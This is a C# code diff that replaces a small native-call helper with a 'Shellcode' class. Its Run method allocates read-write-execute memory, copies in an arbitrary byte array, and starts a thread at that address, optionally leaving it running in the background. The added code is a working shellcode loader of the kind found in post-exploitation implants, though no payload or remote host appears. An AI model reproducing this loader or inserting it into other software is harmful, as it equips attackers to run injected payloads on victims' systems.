@@ -13,55 +13,92 @@ using System.ComponentModel;
 
 namespace Miscellaneous.Handler
 {
-    internal static class NativeCaller
+    class Shellcode
     {
-        [DllImport("kernel32", SetLastError = true)]
-        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
-          int size, int flAllocationType, int flProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr CodeCallerDelegate(IntPtr address);
-
-        private static CodeCallerDelegate function;
-
-        static NativeCaller()
+        public static void Run(byte[] shellcode, bool fork)
         {
-            Load();
-        }
+            if (shellcode.Length == 0)
+                throw new Exception("Shellcode is empty!");
 
-        public static void Call(IntPtr address)
-        {
-            function(address);
-        }
+            IntPtr pMem = VirtualAlloc(UIntPtr.Zero, shellcode.Length,
+                AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
 
-        public static IntPtr AllocateExecutableCode(IntPtr desiredAddress, byte[] code)
-        {
-            IntPtr allocated = VirtualAlloc(desiredAddress, code.Length, 0x1000, 0x40);
-            if (allocated == IntPtr.Zero)
-                throw new Win32Exception(Marshal.GetLastWin32Error());
-            Marshal.Copy(code, 0, allocated, code.Length);
-            return allocated;
-        }
+            if (pMem == IntPtr.Zero || Marshal.GetLastWin32Error() != 0)
+                throw new Exception("Unable to allocate memory region.");
 
-        private static void Load()
-        {
-            // load shellcode
-            int bits = IntPtr.Size * 8;
-            if (bits == 64)
+            try
             {
-                address = AllocateExecutableCode(IntPtr.Zero, callerCode64);
+                //Marshal.Copy(shellcode, 0, pMem, shellcode.Length);
+                IntPtr dwBytes = IntPtr.Zero;
+                WriteProcessMemory(GetCurrentProcess(), pMem, shellcode, shellcode.Length, out dwBytes);
+
+                UInt32 dwThreadId = 0;
+                UIntPtr hThread = CreateThread(UIntPtr.Zero, 0, pMem, IntPtr.Zero, 0, ref dwThreadId);
+
+                if (hThread == UIntPtr.Zero)
+                    throw new Exception("Unable to create thread for shellcode.");
+
+                if (!fork)
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
             }
-            else if (bits == 32)
+            finally
             {
-                address = AllocateExecutableCode(IntPtr.Zero, callerCode);
+                if (!fork)
+                    VirtualFree(pMem, shellcode.Length, AllocationType.Release);
             }
 
-            function = (CodeCallerDelegate)Marshal.GetDelegateForFunctionPointer((IntPtr)address, typeof(CodeCallerDelegate));
         }
 
-        private static byte[] callerCode = new byte[] { 0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0xFF, 0xD0, 0x5D, 0xC2, 0x04, 0x00 };
-        private static byte[] callerCode64 = new byte[] { 0x55, 0x48, 0x89, 0xE5, 0xFF, 0xD1, 0x5D, 0x48, 0x89, 0xEC, 0xC2, 0x08, 0x00 };
-        private static IntPtr address;
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, int dwSize,
+            AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool VirtualFree(IntPtr lpAddress, int dwSize, AllocationType dwFreeType);
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32")]
+        private static extern UIntPtr CreateThread(UIntPtr lpThreadAttributes, UInt32 dwStackSize,
+            IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(UIntPtr hHandle, UInt32 dwMilliseconds);
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
     }
-
 }
